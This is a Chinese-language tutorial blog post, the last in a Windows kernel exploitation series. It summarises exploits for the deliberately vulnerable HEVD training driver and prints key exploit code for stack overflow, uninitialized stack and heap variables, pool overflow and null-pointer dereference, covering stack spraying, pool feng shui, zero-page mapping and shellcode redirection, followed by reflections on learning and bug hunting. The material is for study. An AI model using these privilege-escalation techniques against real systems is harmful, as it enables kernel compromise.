@@ -1,0 +1,445 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="1416c7718ccebe1a2af24780e46b9c8d">前言</h2>
+<p>Hello, 这是<code>windows kernelexploit</code>的第七篇, 也是这个阶段性的最后一篇. 接下来我想做一些挖洞的工作. 所以可能分析性的文章就暂时更新到这里(并不, 只是投入的时间占比可能会更少一些).</p>
+<p>这一篇主要涉及一些我自己对挖洞的思考, 来源于学习过程的积累. 但是都是自己总结, 没有科学依据. 所以我一直挂在自己的博客, 没有外放. 后来想着校内分享就给老师了... 师傅和我说一个系列的希望可以在先知留给备份, 所以就又放上来了. 唔, 虽然是一些很笨的方法, 但是希望师傅们能够给我提供更多的意见. 感激不尽.</p>
+<p><br/>
+我记得两个月前我开始了我的内核学习道路, 于是我开始学习师父给我的HEVD的文章来看. 在学习了UAF这一篇之后, 就把这个系列给放弃了. 因为觉得还是直接做cve的分析比较具有挑战性.</p>
+<p>我记得我的第一篇文章是关于HEVD的, 当时第一次实现了堆喷的时候, 开始惊讶于这个世界的神奇. 所以这样想来也好, 从HEVD开始. 也从HEVD结束.</p>
+<p>当然, 提到HEVD, 得感谢rootkits的杰出工作. 让我放弃了c++走向了python的美满人生(并没有, c++是我和我最后的倔强). 还有一些balabala的人(很重要的), 由于我不是写获奖感言. 所以就不一一列举了.</p>
+<p>由于rootkit的分析已经做的很棒了, 所以我不会对于每一个做出详细的解释, 而是给出概括性的利用总结.在这篇文章当中, 给出的内容如下:</p>
+<pre><code>[+] HEVD的各个漏洞利用的思路
+[+] 通过HEVD总结windows内核漏洞利用.
+[+] 探讨内核的学习之路的一些绕弯的地方
+[+] 关于挖洞的推测</code></pre>
+<p>我比较想聊的是第二个和第三个话题, 如果你看过我以前的博客的话, 你会发现我就是一个菜鸡, 所以和往常一样. 这些都是我自以为是的结论. 不算教程. 如果你在学习过程中发出和我一样的感受的话. 那实在是一件很幸运的事情. 至于第四个点, 算是一些民科的行为, 基于HEVD给出的信息, 想探讨一些对之后挖洞可能会有帮助性的思路. 在之后的道路我会验证他并更新第四部分.</p>
+<p>文章所有的代码实现你可以在我的github上面找到, UAF和write-what-where会有详细的文章解释, 所以就不再贴出来.</p>
+<h2 data-content="1" id="adfcb890820bbd4d59c35d3a67331649">各个漏洞的总结</h2>
+<h3 data-content="1" id="6ff859af2948235ea1bb133b28f21bde">栈溢出</h3>
+<h5 data-content="1" id="02b7714848dac8e4635abf3f22f6e0a9">关键代码段:</h5>
+<div class="highlight"><pre><span></span><span class="cp">#ifdef SECURE</span>
+            <span class="c1">// Secure Note: This is secure because the developer is passing a size</span>
+            <span class="c1">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span>
+            <span class="c1">// there will be no overflow</span>
+            <span class="n">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">));</span>
+    <span class="cp">#else</span>
+            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] Triggering Stack Overflow</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+            <span class="c1">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span>
+            <span class="c1">// because the developer is passing the user supplied size directly to</span>
+            <span class="c1">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span>
+            <span class="c1">// equal to the size of KernelBuffer</span>
+            <span class="n">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span> <span class="c1">// 这里</span>
+    <span class="cp">#endif</span>
+</pre></div>
+<h4 data-content="1" id="b0a092bac25a6aef521b4ab67052f21b">利用思路:</h4>
+<pre><code>[+] 覆盖0x824(ebp-0x81c)的数据, 偏移0x820处写入shellcode
+[+] ret时候覆盖eip, 执行shellcode</code></pre>
+<h5 data-content="1" id="7964e409c9a3268562dda0e13908d286">爬坑点:</h5>
+<pre><code>[+] 恢复堆栈平衡(rootkits):
+    [+] 找到shellcode的ret处, 观察当前堆栈. 执行pop, add esp, 之类的操作恢复平衡.(这一部分需要注意的是, 比起静态分析, 动态调试可以帮助你节省很多时间)
+
+    [+] user space算出内核基地址
+    [+] 算出ret 地址偏移XXXX
+    [+] mov [esp], xxx.
+        ==&gt; 你可以参考我的内核系列的第二篇文章.</code></pre>
+<h5 data-content="1" id="db5642b62d46606772ec6fc5a4f5c35c">假设比较</h5>
+<pre><code>[+] 开发者假设: 由userbuf到kernelbuf的复制功能实现完整
+[+] 攻击者假设: 开发者开发的功能当中开发者可能出现失误造成漏洞点.
+[+] ==&gt; who: 开发者失误</code></pre>
+<h5 data-content="1" id="b4f0bc32d5da2cbaba85ed3c65b79123">exp关键代码段</h5>
+<pre><code>VOID runYourShellCode()
+{
+    const int orignalLength = 0x800;
+    const int overflowLength = 0x20;
+    DWORD lpBytesReturned = 0;
+    char buf[orignalLength + overflowLength+4];
+    memset(buf, 0x41, orignalLength + overflowLength+4);
+
+    *(PDWORD32)(buf +orignalLength + overflowLength) = (DWORD32)&amp;shellCode; // rip
+    // 执行shellcode
+    // 任务: 计算偏移地址
+    DeviceIoControl(hDevice, STACK_OVERFLOW_NUMBER, buf, orignalLength + overflowLength + 4, NULL, 0, &amp;lpBytesReturned, NULL); // 0x1f8 原有大小 0x8覆盖header
+}</code></pre>
+<h3 data-content="1" id="4ffb5189ea129a27e9ea62029e18e026">未初始化栈变量</h3>
+<h5 data-content="1" id="5072692e46078066cae6ddf53b0a89a8">关键代码段</h5>
+<pre><code>#ifndef SECURE
+        DbgPrint("[+] Triggering Uninitialized Stack Variable Vulnerability\n");
+#endif
+
+        // Call the callback function
+        if (UninitializedStackVariable.Callback) { 
+            UninitializedStackVariable.Callback(); // 这里
+        }
+    }</code></pre>
+<h5 data-content="1" id="e0cad828d1e4bfef87d417e9128b6425">利用思路</h5>
+<pre><code>[+] 利用stack spray控制堆栈中的残留数据
+    ==&gt; stack spray: https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/
+[+] 未初始化的栈变量(UninitializedStackVariable)使用的值是堆喷残留的数据. 运行下面的语句, 执行shellcode
+    ==&gt; UninitializedStackVariable.Callback();</code></pre>
+<h5 data-content="1" id="c5792ea04a402a88f9a551c5cc6353b1">爬坑点</h5>
+<p>[+] stack spray</p>
+<pre><code>[+] 理论性的计算stack spray的变化对我来说实在是一件枯燥的事
+    ==&gt; 采用OD或者windbg观察程序堆栈类似`add esp, 8`之后, 堆栈的相关信息
+    ==&gt; 动态调试用于堆喷射的函数NtMapUserPhysicalPages运行过程中堆栈的变化</code></pre>
+<h5 data-content="1" id="23c105d47ecac74442cd77244848a1ce">假设比较</h5>
+<pre><code>[+] 开发者假设: 使用UninitializedStackVariable功能实现完整
+[+] 攻击者假设:
+    ==&gt; 开发者没有正确对变量A赋值初值.
+    ==&gt; 利用系统特性. 可以对A的初值进行预判性的赋值
+    ==&gt; 利用后面代码. 可以执行shellcode
+[+] ==&gt; who: 开发者+系统特性</code></pre>
+<h5 data-content="1" id="5663d77154cd8b74cabf85af8369623c">exp:</h5>
+<p>[+] 关键代码段:</p>
+<pre><code>VOID exploitToRunYourShellCode()
+{
+    DWORD lpBytesReturned = 0;
+    char buf[5] = {};
+    *(PDWORD32)(buf) = 0xBAD0B0B0 + 12; // not magic value
+
+    NtMapUserPhysicalPages_t NtMapUserPhysicalPages =(NtMapUserPhysicalPages_t)GetProcAddress(GetModuleHandle("ntdll"), "NtMapUserPhysicalPages");
+
+    if (MapUserPhysicalPages == NULL)
+    {
+        std::cout &lt;&lt; "[+] Get MapUserPhysicalPages failed!!! " &lt;&lt; GetLastError() &lt;&lt; std::endl;
+        return;
+    }
+
+    // j00ru给的数据
+    // 只要把它全部变为shellcode的地址就可以了
+    PULONG_PTR sprayBuf = (PULONG_PTR)malloc(1024 * 4);
+    memset(sprayBuf, 0x41, 1024 * 4);
+
+    for (int i = 0; i &lt; 1024; i++)
+    {
+        *(PDWORD)(sprayBuf + i) = (DWORD)&amp;shellCode;
+    }
+
+    NtMapUserPhysicalPages(NULL, 0x400, sprayBuf);
+    DeviceIoControl(hDevice, UNINITIAL_STACK_VARIABLE_NUMBER, buf, 5, NULL, 0, &amp;lpBytesReturned, NULL); // 0x1f8 原有大小 0x8覆盖header
+}</code></pre>
+<h3 data-content="1" id="2061ff26d99e23a31eb68d624592a3bc">未初始化堆变量</h3>
+<h5 data-content="1" id="3f42ed811b38a5c4619dfe8cf3032066">关键代码段:</h5>
+<p>[+] c</p>
+<pre><code>#ifdef SECURE
+        else {
+            DbgPrint("[+] Freeing UninitializedHeapVariable Object\n");
+            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+            DbgPrint("[+] Pool Chunk: 0x%p\n", UninitializedHeapVariable);
+
+            // Free the allocated Pool chunk
+            ExFreePoolWithTag((PVOID)UninitializedHeapVariable, (ULONG)POOL_TAG);
+
+            // Secure Note: This is secure because the developer is setting 'UninitializedHeapVariable'
+            // to NULL and checks for NULL pointer before calling the callback
+
+            // Set to NULL to avoid dangling pointer
+            UninitializedHeapVariable = NULL;
+        }
+#else
+            // Vulnerability Note: This is a vanilla Uninitialized Heap Variable vulnerability
+            // because the developer is not setting 'Value' &amp; 'Callback' to definite known value
+            // before calling the 'Callback'
+            DbgPrint("[+] Triggering Uninitialized Heap Variable Vulnerability\n");
+#endif
+
+        // Call the callback function
+        if (UninitializedHeapVariable) {
+            DbgPrint("[+] UninitializedHeapVariable-&gt;Value: 0x%p\n", UninitializedHeapVariable-&gt;Value);
+            DbgPrint("[+] UninitializedHeapVariable-&gt;Callback: 0x%p\n", UninitializedHeapVariable-&gt;Callback);
+            // 这里
+            UninitializedHeapVariable-&gt;Callback();
+        }
+    }</code></pre>
+<h5 data-content="1" id="8e6c8b9b413e4d4a538fa826bbb1c5a8">利用思路</h5>
+<pre><code>[+] 利用堆喷控制堆中残留的数据
+[+] 触发漏洞, 使其重复使用上一次释放的堆
+[+] 利用程序的后面逻辑实现利用</code></pre>
+<h5 data-content="1" id="5cb7540638ba754bac5fd667a4e7cd0a">爬坑点</h5>
+<p>[+] list head:</p>
+<pre><code>[+] target</code></pre>
+<h5 data-content="1" id="44cf8ca6f06b56e5cd1c19d868a19191">假设比较</h5>
+<pre><code>[+] 开发者假设: callback功能实现完成
+[+] 攻击者假设: 开发者未对数据进行合理的赋值, 可以利用系统特性控制数据实现利用
+[+] who: 开发者失误+系统特性</code></pre>
+<h5 data-content="1" id="b2eeaba003f220fcd541fd81147e70e6">exp</h5>
+<p>[+] 关键代码段</p>
+<pre><code>VOID poolFengShui()
+{
+    WCHAR lpszName[0xf0 / 2] = {};
+    memset((char*)lpszName, 'A', 0xf0);
+    // 分配大量的0x256个pool
+    for (int i = 0; i &lt; 256; i++)
+    {
+        *(PDWORD)((char*)lpszName + 0x4) = (DWORD)&amp;shellCode;
+        *(PDWORD)((char*)lpszName + 0xf0 - 4) = i;
+        *(PDWORD)((char*)lpszName + 0xf0 - 3) = i;
+        *(PDWORD)((char*)lpszName + 0xf0 - 2) = i;
+        *(PDWORD)((char*)lpszName + 0xf0 - 1) = i;
+        spray_event[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)lpszName);   // 分配0xf0+0x8(header)的pool
+    }
+    for (int i = 0; i &lt; 256; i++)
+    {
+        CloseHandle(spray_event[i]);
+        i += 4;
+    }
+    // 分配完毕
+}
+
+VOID exploitToRunYourShellCode()
+{
+    DWORD lpBytesReturned = 0;
+    char buf[5] = {};
+    *(PDWORD32)(buf) = 0xBAD0B0B0 + 12; // not magic value
+
+    // 堆喷数据
+    poolFengShui();
+    DeviceIoControl(hDevice, UNINITIAL_HEAP_VARIABLE_NUMBER, buf, 5, NULL, 0, &amp;lpBytesReturned, NULL); // 0x1f8 原有大小 0x8覆盖header
+}</code></pre>
+<h3 data-content="1" id="30c1663daeb9ce1a141d04b3046fb52b">pool oveflow</h3>
+<h5 data-content="1" id="45eacc652419bbce5e8921c0e11ec143">关键代码段:</h5>
+<pre><code>#ifdef SECURE
+        // Secure Note: This is secure because the developer is passing a size
+        // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().
+        // Hence, there will be no overflow
+        RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE);
+#else
+        DbgPrint("[+] Triggering Paged Pool Session Overflow\n");
+
+        // Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability
+        // because the developer is passing the user supplied value directly to
+        // RtlCopyMemory()/memcpy() without validating if the size is greater or
+        // equal to the size of the allocated Pool chunk
+        RtlCopyMemory(KernelBuffer, UserBuffer, Size); // 这里
+#endif</code></pre>
+<h5 data-content="1" id="50dfbb2792d93e9596cdbd6809d917d8">利用思路:</h5>
+<pre><code>[+] 利用堆喷留下合适的0x200大小的数据
+[+] 0页分配, shellcode地址放在0x60处
+[+] 构造数据使溢出后的数据足以把typeinfo值为0, 
+[+] 调用closeHandle时候调用shellcode</code></pre>
+<h5 data-content="1" id="9bee7e4ebb4a91f8ec6557eea613ad2e">爬坑</h5>
+<p>[+] 堆喷的时候合理控制空隙</p>
+<h5 data-content="1" id="78c68bc546e413873620d606e5e05af1">假设比较</h5>
+<pre><code>[+] 开发者假设: callback功能实现完成
+[+] 攻击者假设: 开发者未对数据进行合理的校验, 可以利用系统特性控制数据实现利用
+[+] who: 开发者失误+系统特性</code></pre>
+<h5 data-content="1" id="2b96c40214b9d8fcf2666851bc446e2d">exp关键代码</h5>
+<pre><code>// 使用CreateEvent API去控制风水布局
+VOID poolFengShui()
+{
+    // 分配大量的0x40个pool
+    for (int i = 0; i &lt; 0x1000; i++)
+        spray_event[i] =  CreateEventA(NULL, FALSE, FALSE, NULL);   // 0x40
+
+    // 0x40 * 8 = 0x200
+    for (int i = 0; i &lt; 0x1000; i++)
+    {
+        for(int j = 0; j &lt; 0x8; j++)
+            CloseHandle(spray_event[i+j]);
+        i += 8;
+    }
+
+    // 分配完毕
+}
+
+VOID exploit()
+{
+    const int overLength = 0x1f8;
+    const int headerLength = 0x28;
+    DWORD lpBytesReturned = 0;
+    char buf[overLength+headerLength];
+    memset(buf,0x41 ,overLength+headerLength);
+
+    // 伪造利用的数据
+    // 伪造typeInfo. 使其为0x00
+    *(DWORD*)(buf + overLength + 0x00) = 0x04080040;
+    *(DWORD*)(buf + overLength + 0x04) = 0xee657645;
+    *(DWORD*)(buf + overLength + 0x08) = 0x00000000;
+    *(DWORD*)(buf + overLength + 0x0c) = 0x00000040;
+    *(DWORD*)(buf + overLength + 0x10) = 0x00000000;
+    *(DWORD*)(buf + overLength + 0x14) = 0x00000000;
+    *(DWORD*)(buf + overLength + 0x18) = 0x00000001;
+    *(DWORD*)(buf + overLength + 0x1c) = 0x00000001;
+    *(DWORD*)(buf + overLength + 0x20) = 0x00000000;
+    *(DWORD*)(buf + overLength + 0x24) = 0x00080000;    // key fake here
+
+    /*
+    *   [+] (TYPEINFO 为0x00)伪造0x60, 覆盖函数指针使其执行shellcode
+    */
+    PVOID               fakeAddr = (PVOID)1;
+    SIZE_T              MemSize = 0x1000;
+
+    *(FARPROC *)&amp;NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll"),
+        "NtAllocateVirtualMemory");
+    if (NtAllocateVirtualMemory == NULL)
+    {
+        return ;
+    }
+
+    std::cout &lt;&lt; "[+]" &lt;&lt; __FUNCTION__ &lt;&lt; std::endl;
+    if (!NT_SUCCESS(NtAllocateVirtualMemory(HANDLE(-1),
+        &amp;fakeAddr,
+        0,
+        &amp;MemSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE)) || fakeAddr != NULL)
+    {
+        std::cout &lt;&lt; "[-]Memory alloc failed!" &lt;&lt; std::endl;
+        return ;
+    }
+    *(DWORD*)(0 + 0x60) = (DWORD)&amp;shellCode;    // change为shellcode地址
+
+    poolFengShui();
+    DeviceIoControl(hDevice, POOL_OVERFLOW_NUMBER, buf, overLength+headerLength, NULL, 0, &amp;lpBytesReturned, NULL); // 0x1f8 原有大小 0x8覆盖header
+}</code></pre>
+<h3 data-content="1" id="40955bf44bb3b4a8ce0507e658e76574">空指针</h3>
+<h5 data-content="1" id="45d05db90f6ad822598d88cd1e71f748">关键代码</h5>
+<pre><code>[...]
+        NullPointerDereference = NULL; // here
+        }
+
+#ifdef SECURE
+        // Secure Note: This is secure because the developer is checking if
+        // 'NullPointerDereference' is not NULL before calling the callback function
+        if (NullPointerDereference) {
+            NullPointerDereference-&gt;Callback();
+        }
+#else
+        DbgPrint("[+] Triggering Null Pointer Dereference\n");
+
+        // Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability
+        // because the developer is not validating if 'NullPointerDereference' is NULL
+        // before calling the callback function
+        NullPointerDereference-&gt;Callback(); // here
+#endif</code></pre>
+<h5 data-content="1" id="b1fa92db74d8f718527edede501d9e47">利用思路</h5>
+<pre><code>[+] 构造合理数据, 使其分配0页
+[+] 触发漏洞执行shellcode</code></pre>
+<h5 data-content="1" id="e639c5d8abf800a1b4b9c32fd52c7a89">爬坑点</h5>
+<p>[+] 分配内存页</p>
+<pre><code>if (!NT_SUCCESS(NtAllocateVirtualMemory(HANDLE(-1),
+        &amp;fakeAddr,  //==&gt; 这个地方别赋值为NULL(0), 否则系统会自动分配地址(请参考MSDN)
+        0,
+        &amp;MemSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE)) || fakeAddr != NULL)
+    {
+        std::cout &lt;&lt; "[-]Memory alloc failed!" &lt;&lt; std::endl;
+        return ;
+    }</code></pre>
+<h5 data-content="1" id="773025d8c8a047eec4191fea60202550">假设比较</h5>
+<pre><code>[+] 开发者假设: callback功能实现完成
+[+] 攻击者假设: 开发者未对数据进行合理的校验, 可以利用系统特性控制数据实现利用
+[+] who: 开发者失误+系统特性</code></pre>
+<h5 data-content="1" id="e1dc5e41c4c60678f77974ba28329625">exp关键代码</h5>
+<pre><code>VOID exploitToRunYourShellCode()
+{
+    DWORD lpBytesReturned = 0;
+    char buf[5] = {};
+    *(PDWORD32)(buf) = 0xBAD0B0B0+12;   // not magic value
+    // 执行shellcode
+    // 任务: 计算偏移地址
+
+    *(FARPROC *)&amp;NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll"),
+        "NtAllocateVirtualMemory");
+    if (NtAllocateVirtualMemory == NULL)
+    {
+        return;
+    }
+    PVOID               fakeAddr = (PVOID)1;
+    SIZE_T              MemSize = 0x1000;
+    std::cout &lt;&lt; "[+]" &lt;&lt; __FUNCTION__ &lt;&lt; std::endl;
+    if (!NT_SUCCESS(NtAllocateVirtualMemory(HANDLE(-1),
+        &amp;fakeAddr,
+        0,
+        &amp;MemSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE)) || fakeAddr != NULL)
+    {
+        std::cout &lt;&lt; "[-]Memory alloc failed!" &lt;&lt; std::endl;
+        return;
+    }
+
+    *(DWORD*)(0 + 0x4) = (DWORD)&amp;shellCode;
+
+    DeviceIoControl(hDevice, NULL_POINTER_DEFERENCE_NUMBER, buf, 5, NULL, 0, &amp;lpBytesReturned, NULL); // 0x1f8 原有大小 0x8覆盖header
+}</code></pre>
+<h2 data-content="1" id="17988f91219ddc9a05a17b03220150b3">从HEVD引发的内核漏洞学习的思考</h2>
+<h5 data-content="1" id="537fb5a8f6c2689707ee22acecb53c7b">难度比较</h5>
+<p>前段时间在做DDCTF的时候, 我就有了把HEVD的这个重新写一下的想法. 对比一下他们的不同之处. HEVD这个, 我写完的时间花了三个小时(stack spray第一次学习, 在那里卡了一会). 所以还是蛮简单的. 所以我想先讲一下HEVD和我自己学习的CVE的不同. 来看看对内核学习有什么有用的信息.</p>
+<h6 data-content="1" id="836b71c474ba19fe5c72cff7370e00a0">分析代码</h6>
+<p>HEVD:</p>
+<pre><code>[+] HEVD的代码网上有给出相应的c代码, 你可以不用无脑去逆向. 可以直接阅读源码. 进行触发. 并很容易的根据相应的程序逻辑构造合理的数据进行利用.</code></pre>
+<p>CVE:</p>
+<pre><code>[+] 这几个当中, 以我目前来看分析代码的逻辑才是最难的一部分.
+    ==&gt; 你得确定漏洞的触发点 --&gt; 得有代码的逻辑分析能力
+    ==&gt; 你得确定调用怎样的合适的API, 各个参数放怎样的数据才是合理的. --&gt; 对windows编程要有相应的熟悉.</code></pre>
+<p>CVE的学习, 如果你做过1day的比较之后, 你会发现. 定位漏洞点其实借助于其他的小技巧(比如补丁比较)可能没有那么难. 但是触发了漏洞之后利用函数里面的哪一段数据才能合理的实现利用我觉得是更难的部分. 因为很容易迷失在此中. 所以我做的过程当中面对这个问题的解决方案是:</p>
+<pre><code>[+] xref触发漏洞逻辑
+[+] 利用调试去做与补丁比较反方向的事, 验证判断
+[+] 构建POC
+        ==&gt; 确定漏洞的相关内核数据类型, 如果前辈们已经做过了. 就直接参考前辈的经验
+        ==&gt; 如果没做过:
+            ==&gt; 结合windows nt4泄露源码实现逆向
+            ==&gt; 动态调试, 对比哪些数据被污染了(如果这一部分做得好的话, 甚至可以不用逆向)</code></pre>
+<h5 data-content="1" id="0818a2d195724e7488d74e82d1e64d3f">开发难度</h5>
+<p>HEVD:</p>
+<pre><code>[+] HEVD的利用github上面有很多很多, 如果你不会的话你可以参考其他人的代码与教程学习
+[+] HEVD对数据的操控十分简单. 大多数数据都是连续的(你可以覆盖可控数据的n个byte)</code></pre>
+<p>CVE:</p>
+<pre><code>[+] 很多CVE的利用在网上都没有push出相应的源代码, 得自己游离于google的开发平台做相应的资料搜集.
+[+] 大多数漏洞操纵的数据都是有限的, 而且很容易写原语残缺(可以参考我的第二篇文章)
+[+] 缓解措施问题: 针对各个平台, 有形形色色的缓解措施等着你. 其中的绕过让人头疼不已.</code></pre>
+<p>我一度困扰于缓解措施和各种绕过, 所以对于此, 我做了下面的解决方案.</p>
+<pre><code>[+] 寻求一种通用性的方法: 直接替换system token和current process token. 这种方法能够实现内核提权, 你只需要绕过KASLR. 以及获取相应的读写权限即可
+[+] 多读以前的漏洞, 看看前辈们如何解决写原语残缺.
+    ==&gt; 控制关键数据结构体, 获取更优秀的读写能力
+[+] 在github上面更新了(目前更新到了rs3)漏洞利用的合集, 保证我在各个平台上至少掌握一种方法可利用.</code></pre>
+<h2 data-content="1" id="14a45e7d97de3c5af8a60fa87ff3174d">一些自己内核学习的过程中绕弯的地方</h2>
+<h3 data-content="1" id="76627318fbc3f89b0fcb5c4fa79a4604">贫穷</h3>
+<p>这一部分其实没有开玩笑, 在我早期的学习过程中. 我用着我的4G的笔记本. 同时开着两三个虚拟机. 然后电脑天天处于爆炸的状态. 十分影响学习的效率. 所以如果可以的话, 尽量使用性能比较好的电脑. 好的工具会让你事半功倍.</p>
+<h3 data-content="1" id="dea6ca90e47d0b094660cdecd1700c4e">理论分析与调试分析</h3>
+<p>我做的最难受的洞应该是<a href="https://xiaodaozhi.com/exploit/71.html" target="_blank">cve-2017-0263</a>, 因为那是小刀师傅的博客上面做的是一篇十分详细的分析. 所以我觉得应该是蛮简单的, 但是我当时差不多花了一个星期左右在上面, 因为我走错了重点. 小刀师傅的博客上面有对每一个控件的原理相关的数据变量都做详细的分析, 能做到此是基于其强大的内功. 他熟悉windows的管理细节, 以及内核结构的实现思路. 这一部分是需要经验的积累的. 然而初入内核的我是根本不可能有内功这种东西的. 所以我做的最大的错误就是让自己陷入知识的海洋当中. 后来的解决方案是我开始从exp入手, 定位相应的关键代码段.然后记住关键的代码信息, 完成了那个漏洞的理解分析.</p>
+<p>所以我们可以牵涉到另外一个东西. 我在学习的过程当中, 一开始翻阅了大量的paper, 光是blackhat的演讲paper就搜集了一大堆, 但是经常看着看着就忘了. 大概自己实在是一个不擅长寄东西的人.所以我开始对paper做了另外一个十分的定义. 字典. 哪里不会点哪里. 学堆喷的时候去参考11年的pool, feng shui的时候去看13的paper. 在重复的查阅当中. 获取更深的理解.</p>
+<h2 data-content="1" id="cb2bfa93f533f3437182a4c67c4df825">关于挖洞的探讨.</h2>
+<p>依然想首先讲出, 我还没有开始挖洞, 所以这一部分的东西只是我下一步的工作的主体思路. 在后期当中我会更新变改正.</p>
+<h5 data-content="1" id="77eef389ddd303d58018c5cf25a07992">开发者失误</h5>
+<p>在前面的过程当中. 我对每一个类型的洞都给了相应的背锅归属, 我把pool overflow, stackoverflow归类于开发者背锅. 然而微软的老师们都是很厉害的存在, 所以我觉得想去挖这种类型的洞概率还是挺小的. 如果说有的话, 应该是在相应的比较老的源码当中. 在那个时候微软还是良莠不齐, 以及大家并不注重安全的年代我觉得漏洞可能存在. 所以相应的思路是:</p>
+<pre><code>[+] 比较古老的windows和现有的windows(bindiff)
+[+] 重点观测未更改的函数
+    ==&gt; 留意核心功能的函数, 攻击面广.</code></pre>
+<h5 data-content="1" id="d6f3e22a60c8042e929f5735395a8bce">系统特性</h5>
+<p>这一部分的挖洞是我最想做的. 做CVE和HEVD的分析的时候, 一般我都会去尝试假设如果自己实现这份源码会去怎么实现. 最终得出的结论是我可能在<code>整数溢出+UAF模式的回调攻击</code>这两个个类型的洞会百分百命中.</p>
+<h6 data-content="1" id="9309947235faf239688094946607c7f7">整数溢出</h6>
+<p><code>整数溢出</code>的漏洞其实我觉得锅是不应该给开发者的, 寄存器的局限性和语言的局限性导致了这个漏洞的出现. 正常人的思路应该是<code>FFFFFFFF+1=1 0000 0000</code>, 然而由于局限性的出现, 结果变为了<code>0</code>, 所以我觉得由<code>人的惯性思维</code>去入手. 应该会有不错的收获. 所以在下面的学习当中. 我会主要关注于整数溢出的漏洞挖掘.</p>
+<p>目前的大概思路是:</p>
+<pre><code>[+] 寻找最新的补丁
+[+] 使用IDA python完成相应的代码搜索. 过滤条件:
+    ==&gt; PALLOCMEM
+    ==&gt; without: ULongLongToLong</code></pre>
+<h6 data-content="1" id="8d0231717887b8f2fab1afc31c822fb7">UAF攻击</h6>
+<p><code>UAF</code>的漏洞也应该是由系统特性来背锅. 因为在设计方面, 使用用户回调来与user space的相关数据实现交互可以极大的提高效率. 引发了潜在的安全问题. 在微软最开始的设计当中, 应该对于这一部分的考虑挺少的. 所以我觉得这一部分的洞可能比<code>整数溢出</code>漏洞更多一些. 但是不做这一方面的原因是, 手工寻找此类型的漏洞可能过于痛苦. 所以我得去学一点<code>fuzz</code>的知识. 那也是一个漫长的过程. 所以先慢慢来.</p>
+<p>目前的大概思路是:</p>
+<pre><code>[+] 学习fuzz
+[+] 构建好的策略</code></pre>
+<h2 data-content="1" id="aade1e51aad81267f7b73f3f8654fe2a">相关链接</h2>
+<pre><code>==&gt; 北归姐的个人博客: www.baidu.com(北归姐的博客不开放. 所以先占位)
+==&gt; sakura师父的个人博客: http://eternalsakura13.com/
+==&gt; 小刀师傅的博客: https://xiaodaozhi.com/(小刀师傅拥有着我所有想要的优点)
+==&gt; rootkits老师的博客: https://rootkits.xyz/(入门的良心材料)
+==&gt; j00ru: https://j00ru.vexillium.org/(我的偶像, 我能做到的只是这副皮囊比偶像帅一点(逃), 其他的还有很长的距离去赶)
+==&gt; alex: http://www.alex-ionescu.com/(一个非常厉害非常厉害的老师. 学windows内核内功方面的字典)
+==&gt; NCC group: https://www.nccgroup.trust/us/(发布的paper有很强的研究意义)
+==&gt; coresecurity: https://support.coresecurity.com/hc/en-us(发布的paper有很强的研究意义)
+==&gt; sensepost: https://sensepost.com/(发布的paper有很强的研究意义)
+==&gt; awesome kernel: https://github.com/ExpLife0011(一份相当有用的资料来源地. explife老师帮忙节省了很多找资料的细节)
+==&gt; blackhat: https://www.blackhat.com/(有很多的paper, 大量的最新的研究)
+==&gt; k0keoyo: https://github.com/k0keoyo(在老师的github上面学到很多.) 
+==&gt; 我的博客地址: https://www.redog.me/</code></pre>
+<h2 data-content="1" id="4b88a97aed90312736c71b3d9f26da5a">后记</h2>
+<p>内核系列分析的文章到这里告一段落. 十分感谢你阅读完这些又长又丑的文章(假装自己的博客有人看的样子). 希望能够对你有所帮助.</p>
+<p>做这个系列的目的是, 在我学习的过程中, 阅读了大量的前辈们的文章, 他们把windows的闭源变成了开源. 所以我觉得很酷. 我也想做这样的事.</p>
+<p>另外一个方面, 自己的学习过程当中实在是一个相当愚蠢的过程, 犯了大量的错误, 所以想把自己犯的错给贴出来. 如果能够帮助你避免重复犯错实在是幸运的事.</p>
+<p>最后, wjllz是人间大笨蛋.</p>
+</div>
+</div>
